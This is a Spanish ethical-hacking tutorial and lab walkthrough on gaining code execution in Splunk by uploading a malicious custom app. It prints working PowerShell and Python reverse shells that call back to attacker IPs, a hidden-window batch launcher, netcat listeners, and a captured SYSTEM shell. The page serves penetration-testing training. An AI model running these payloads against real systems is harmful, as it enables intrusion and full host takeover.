
# Splunk - Ataques

Como se explicó en la sección anterior, podemos obtener ejecución remota de código en Splunk mediante la creación de una aplicación personalizada para ejecutar scripts de Python, Batch, Bash o PowerShell. A partir del análisis de detección de Nmap, notamos que nuestro objetivo es un servidor Windows. Dado que Splunk viene con Python instalado, podemos crear una aplicación Splunk personalizada que nos brinde ejecución remota de código mediante Python o un script de PowerShell.

## <mark style="color:purple;">Relacionado</mark>

Además de esta sección puedes consultar el proceso de explotación de una máquina Hard de Hack the Box, donde vemos muchas mas técnicas que las recogidas aquí para explotar sistemas Splunk:

{% content-ref url="/pages/VrWhBSHAxezslAqcAGmp" %}
[Haze](/ethical-hacking-cheatsheet/writeups/hack-the-box/haze.md)
{% endcontent-ref %}

***

## Abuso de la funcionalidad incorporada

Podemos usar [este](https://github.com/0xjpuff/reverse_shell_splunk) paquete Splunk para ayudarnos. El directorio `bin` de este repositorio tiene ejemplos para [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) y [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1) . Veamos esto paso a paso.

Para lograr esto, primero debemos crear una aplicación Splunk personalizada utilizando la siguiente estructura de directorio.

```shell-session
afsh4ck@hkali$ tree splunk_shell/

splunk_shell/
├── bin
└── default

2 directories, 0 files
```

El directorio `bin` contendrá todos los scripts que deseamos ejecutar (en este caso, un reverse shell de PowerShell) y el directorio predeterminado tendrá nuestro archivo `inputs.conf`. Nuestro reverse shell será un PowerShell one-liner:

```bash
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

El archivo [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) le indica a Splunk qué script debe ejecutar y cualquier otra condición. Aquí configuramos la aplicación como habilitada y le indicamos a Splunk que ejecute el script cada 10 segundos. El intervalo siempre se expresa en segundos y la entrada (script) solo se ejecutará si esta configuración está presente.

```shell-session
afsh4ck@kali$ cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

Necesitamos el archivo .bat, que se ejecutará cuando se implemente la aplicación y ejecutará la línea única de PowerShell.

```powershell
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Una vez creados los archivos, podemos crear un tarball o un archivo `.spl`:

```shell-session
afsh4ck@kali$ tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

El siguiente paso es elegir `Install app from file` y cargar la aplicación:  &#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/113/install_app.png" alt=""><figcaption></figcaption></figure>

Antes de cargar la aplicación personalizada maliciosa, iniciamos un listener usando Netcat o [socat](https://linux.die.net/man/1/socat) .

```shell-session
afsh4ck@kali$ sudo nc -lnvp 443

listening on [any] 443 ...
```

En la página `Upload app`, haz clic en explorar, elija el archivo .tar que creamos anteriormente y haz clic en `Upload`.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/upload_app.png" alt=""><figcaption></figcaption></figure>

Tan pronto como cargamos la aplicación, se recibe un reverse shell ya que el estado de la aplicación cambiará automáticamente a `Enabled`.

```shell-session
afsh4ck@kali$ sudo nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145


PS C:\Windows\system32> whoami

nt authority\system


PS C:\Windows\system32> hostname

APP03


PS C:\Windows\system32>
```

En este caso, obtuvimos un shell como `NT AUTHORTY\SYSTEM`. Si se tratara de una evaluación del mundo real, podríamos proceder a enumerar el destino en busca de credenciales en el registro, la memoria o almacenadas en otro lugar del sistema de archivos para usarlas en el movimiento lateral dentro de la red. Si este fuera nuestro punto de apoyo inicial en el entorno del dominio, podríamos usar este acceso para comenzar a enumerar el dominio de Active Directory.

Si estuviéramos tratando con un host Linux, tendríamos que editar el script de Python `rev.py` antes de crear el archivo tar y cargar la aplicación maliciosa personalizada. El resto del proceso sería el mismo y obtendríamos una conexión de shell inversa en nuestro receptor Netcat y estaríamos listos para la acción.

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

Si el host Splunk comprometido es un servidor de implementación, probablemente será posible lograr RCE en cualquier host que tenga instalados Universal Forwarders. Para enviar un reverse shell a otros hosts, la aplicación debe ubicarse en el directorio `$SPLUNK_HOME/etc/deployment-apps` del host comprometido. En un entorno con uso intensivo de Windows, necesitaremos crear una aplicación utilizando un shell inverso de PowerShell, ya que los Universal Forwarders no se instalan con Python como el servidor Splunk.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.201.50
```

> Ataca el objetivo de Splunk y obtén la ejecución remota del código. Envía el contenido del archivo flag.txt en el directorio c:\loot.

### Escaneo de puertos

Podemos ver que Nmap identificó el servicio `Splunkd httpd` en el puerto 8000 y el puerto 8089, el puerto de administración de Splunk para la comunicación con la API REST de Splunk.

```bash
sudo nmap -v -sV -T5 10.129.201.50

PORT      STATE    SERVICE        VERSION
80/tcp    open     http           Microsoft IIS httpd 10.0
135/tcp   open     msrpc          Microsoft Windows RPC
139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
1107/tcp  filtered isoipsigport-2
3389/tcp  open     ms-wbt-server  Microsoft Terminal Services
5985/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open     ssl/http       Splunkd httpd
8080/tcp  open     http           Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
8089/tcp  open     ssl/http       Splunkd httpd
8254/tcp  filtered unknown
16018/tcp filtered unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Accedemos por https con las credenciales por defecto y entramos sin problema:

<figure><img src="/files/Nj35GlAnlm7jQgkpQ2bA" alt=""><figcaption></figcaption></figure>

### Preparación del exploit

Vamos a usar este repositorio:

{% embed url="<https://github.com/0xjpuff/reverse_shell_splunk>" %}

```
tree .                 
.
├── bin
│   ├── rev.py
│   ├── run.bat
│   └── run.ps1
└── default
    └── inputs.conf
```

Este directorio contiene 2 carpetas, una con ejecutables y una con un archivo de configuración.

Editamos `run.ps1` para añadir nuestra IP y puerto de atacante:

```powershell
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.127',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

También editamos inputs.conf de la siguiente manera:

```powershell
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10

@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Una vez guardamos los archivos lo comprimimos con el siguiente comando:

```bash
tar -cvzf updater.tar.gz reverse_shell_splunk 

reverse_shell_splunk/
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/bin/run.bat
reverse_shell_splunk/bin/run.ps1
```

### Subida del exploit

Dentro de Apps hacemos click en Install app from file:

<figure><img src="/files/XDGJ63dcbXNgkNloqrHR" alt=""><figcaption></figcaption></figure>

Antes de cargar la aplicación personalizada maliciosa, iniciamos un listener usando Netcat:

```shell-session
afsh4ck@kali$ sudo nc -lnvp 4444

listening on [any] 443 ...
```

En la página `Upload app`, haz clic en explorar, elija el archivo .tar que creamos anteriormente y haz clic en `Upload`.

<figure><img src="/files/qg2sGL63fYPGwqGkteU7" alt=""><figcaption></figcaption></figure>

```bash
afsh4ck@kali$ sudo nc -lnvp 4444

listening on [any] 443 ...
Connection received

id
PS C:\Windows\system32> 
```

Tenemos una shell! Vamos a acceder al directorio `C:/loot` para hacernos con la flag:

```powershell
PS C:\Windows\system32> cd C://loot
PS C:\loot> dir

    Directory: C:\loot

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/29/2021   6:16 PM             16 flag.txt                                                              


PS C:\loot> cat flag.txt
l00k_ma_no_***********
```
